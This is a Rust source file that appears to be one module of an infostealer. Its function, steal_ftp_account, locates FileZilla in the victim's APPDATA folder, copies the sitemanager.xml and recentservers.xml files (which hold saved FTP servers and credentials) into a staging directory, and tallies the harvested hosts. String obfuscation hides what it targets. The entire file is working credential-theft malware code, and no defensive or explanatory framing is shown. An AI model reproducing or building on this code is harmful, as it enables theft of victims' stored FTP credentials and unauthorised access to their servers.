use std::fs;
use std::io::BufReader;
use std::fs::File;
use std::collections::HashSet;
use xml::reader::{EventReader, XmlEvent};

pub fn steal_ftp_account(path: String) -> Option<String> {
    let appdata_path = std::env::var(obfstr::obfstr!("APPDATA")).unwrap();
    let filezilla_path = format!("{appdata_path}\\{}", obfstr::obfstr!("FileZilla"));
    let mut unique_hosts = HashSet::new();

    if std::path::Path::new(&filezilla_path).exists() {
        let _ = fs::create_dir(format!("{path}\\{}\\", obfstr::obfstr!("FileZilla")));

        for file_name in &[obfstr::obfstr!("sitemanager.xml"), obfstr::obfstr!("recentservers.xml")] {
            let file_path = format!("{filezilla_path}\\{file_name}", file_name = file_name);
            if std::path::Path::new(&file_path).exists() {
                fs::copy(file_path.clone(), &format!("{path}\\{}\\{file_name}", obfstr::obfstr!("FileZilla"), file_name = file_name)).ok()?;

                let file = File::open(&file_path).unwrap();
                let file = BufReader::new(file);
                let parser = EventReader::new(file);
                let mut inside_host = false;

                for e in parser {
                    match e {
                        Ok(XmlEvent::StartElement { name, .. }) => {
                            if name.local_name == obfstr::obfstr!("Host") {
                                inside_host = true;
                            }
                        },
                        Ok(XmlEvent::Characters(s)) => {
                            if inside_host {
                                unique_hosts.insert(s);
                            }
                        },
                        Ok(XmlEvent::EndElement { name }) => {
                            if name.local_name == obfstr::obfstr!("Host") {
                                inside_host = false;
                            }
                        },
                        Err(e) => {
                            println!("Error: {}", e);
                            break;
                        },
                        _ => {}
                    }
                }
            }
        }
    } 

    unsafe {
        crate::SERVERS += unique_hosts.len();
    }

    Some(obfstr::obfstr!("FileZilla").to_string())
}
